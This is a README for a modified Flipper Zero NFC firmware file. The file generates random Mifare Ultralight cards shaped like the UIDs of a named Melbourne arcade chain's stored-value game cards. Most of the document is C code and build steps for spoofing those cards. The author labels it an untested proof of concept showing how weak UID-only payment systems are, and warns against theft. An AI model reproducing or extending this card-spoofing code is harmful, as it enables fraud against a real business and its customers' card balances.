# flipper_NFC_gamecard_hack


In Melbourne AU we have a popular arcade chain that uses the EMBED card system with Mifare ULTRALIGHT cards for game cards. I did some checks with the small pool of cards I have and found the last 2 octets are not changing from 0x00.

This is a modded file for the built in flipper NFC app that adds the option to create a random game card based off my findings. In theory it should work but who knows. I dont think it checks data stored on the card.

DO NOT USE THIS TO STEAL OTHER PEOPLES MONEY. THIS IS A PROOF OF CONCEPT TO SHOW THE INSECURITY OF ONLY USING THE UID IN A CARD BASED MONEY SYSTEM. I HAVE NOT TESTED THIS AT ALL. THE CHANCE OF YOU FINDING A CARD THAT HAS MONEY, IS A STAFF, A TECH OR A VALID NON EXPIRED CARD IS SUPER LOW. YOU WILL PROBABLY GET SPOTTED BY A STAFF MEMBER IF YOU ARE TRYING THIS. IT IS NOT MY RESPONSIBILITY IF YOU GET CAUGHT, FINED, BANNED, JAILED OR THE EARTH OPENS UP AND SWALLOWS YOU WHOLE.

Please note that I cannot program in C or C++ or any form of C programming. I can do python, AutoIT, Arduino, Bash and Batch but I'm waaaaay out of practice. This is just hacked up using what was already there in the unleashed firmware. The file is prob different in OG, Roguemaster or any other firmware you want to use.

Instructions:
Copy this file over the top of the original file located ``` lib/nfc/helpers/ ``` and build the firmware. tested with unleashed unlshd-020

Once the new compiled firmware is loaded onto the flipper go to Menu -> NFC -> Add Manually -> Mifare (Timezone)

Do not copy to the flipper. nothing will change.


My changes to the original file are below.

Added: 

```
static void nfc_generate_mf_tz_uid(uint8_t* uid) {
    uid[0] = NXP_MANUFACTURER_ID;
    furi_hal_random_fill_buf(&uid[1], 6);
    // Timezone use 00 on last 2 octets with the sample size ive tested. 
    uid[5] = 0x00;
    uid[6] = 0x00;
}
```

```
static void nfc_generate_mf_tz_common(NfcDeviceData* data) {
    data->nfc_data.type = FuriHalNfcTypeA;
    data->nfc_data.interface = FuriHalNfcInterfaceRf;
    data->nfc_data.uid_len = 7;
    nfc_generate_mf_tz_uid(data->nfc_data.uid);
    data->nfc_data.atqa[0] = 0x44;
    data->nfc_data.atqa[1] = 0x00;
    data->nfc_data.sak = 0x00;
    data->protocol = NfcDeviceProtocolMifareUl;
}
```

```
static void nfc_generate_mf_tz_orig(NfcDeviceData* data) {
    nfc_generate_common_start(data);
    nfc_generate_mf_tz_common(data);

    MfUltralightData* mful = &data->mf_ul_data;
    mful->type = MfUltralightTypeUnknown;
    mful->data_size = 16 * 4;
    mful->data_read = mful->data_size;
    nfc_generate_mf_ul_copy_uid_with_bcc(data);
    // Theres some carry over data between the few cards I have here. This data is below.
    memset(&mful->data[9], 0x48, 1);
    memset(&mful->data[10], 0xF0, 1);
    // There looks to be some random data for bytes 16 to 31. 
    furi_hal_random_fill_buf(&mful->data[16], 16);

}
```

```
static const NfcGenerator mf_tz_generator = {
    .name = "Mifare (Timezone)",
    .generator_func = nfc_generate_mf_tz_orig,
};
```

And added ``` &mf_tz_generator, ``` to ``` const NfcGenerator* const nfc_generators[] = { ```
